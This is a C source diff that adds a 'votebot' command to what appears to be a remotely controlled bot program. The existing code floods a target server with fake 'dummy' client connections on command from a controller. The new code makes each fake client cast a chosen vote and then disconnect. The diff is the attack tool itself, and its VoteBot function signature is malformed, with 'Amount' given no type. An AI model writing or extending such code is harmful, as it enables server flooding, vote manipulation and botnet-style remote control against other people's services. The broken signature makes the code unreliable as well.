@@ -206,7 +206,7 @@ unsigned long genip()
 	return ul_dst;
 }
 
-void ConnectDummies(const char *IP, int Port, int Amount)
+void ConnectDummies(const char *IP, int Port, int Amount, int Vote)
 {
 	AmountofDummies = Amount; // for tick (keep alive)
 
@@ -284,6 +284,15 @@ void ConnectDummies(const char *IP, int Port, int Amount)
 		SendData((const char*)buffer, BufferSize, i);
 
 		//Debug(&buffer[0], BufferSize);
+
+		if(Vote)
+		{
+			ZeroMemory(buffer, 2048);
+			BufferSize = PackVote(&buffer[0], i, Vote);
+			SendData((const char*)buffer, BufferSize, i);
+
+			//Debug(&buffer[0], BufferSize);
+		}
 	}
 	//Close(0);
 }
@@ -301,6 +310,12 @@ void DisconnectDummies()
 		BufferSize = PackDisconnect(&buffer[0], i);
 		SendData((const char*)buffer, BufferSize, i);
 	}
+}
+
+void VoteBot(const char *IP, int Port, Amount, int v)
+{
+	ConnectDummies(IP, Port, Amount, v);
+	m_WantRemoveDummies = true;
 }
 
 void Tick()
@@ -321,6 +336,9 @@ void Tick()
 			BufferSize = PackKeepAlive(&buffer[0], i);
 			SendData((const char*)buffer, BufferSize, i);
 		}
+
+		if(m_WantRemoveDummies)
+			DisconnectDummies();
 	}
 	else
 		time++;
@@ -379,6 +397,21 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 			else if(strcmp(aCmd[0], "dcdummies") == 0)
 			{
 				DisconnectDummies();
+				send(g_Client, "Dummies disconnected", strlen("Dummies disconnected"), 0);
+			}
+			else if(strstr(aCmd[0], "votebot"))
+			{
+				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0])
+				{
+					int Port = atoi(aCmd[2]);
+					int Num = atoi(aCmd[3]);
+					int Vote = atoi(aCmd[4]);
+					VoteBot(aCmd[1], Port, Num, Vote);
+
+					send(g_Client, "Dummies connected (Voting...)", strlen("Dummies connected (Voting...)"), 0);
+				}
+				else
+					send(g_Client, "Please use: votebot <ip> <port> <num> <vote>", strlen("Please use: votebot <ip> <port> <num> <vote>"), 0);
 			}
 			else
 				send(g_Client, "We don't know this cmd. Try again.", strlen("We don't know this cmd. Try again."), 0);
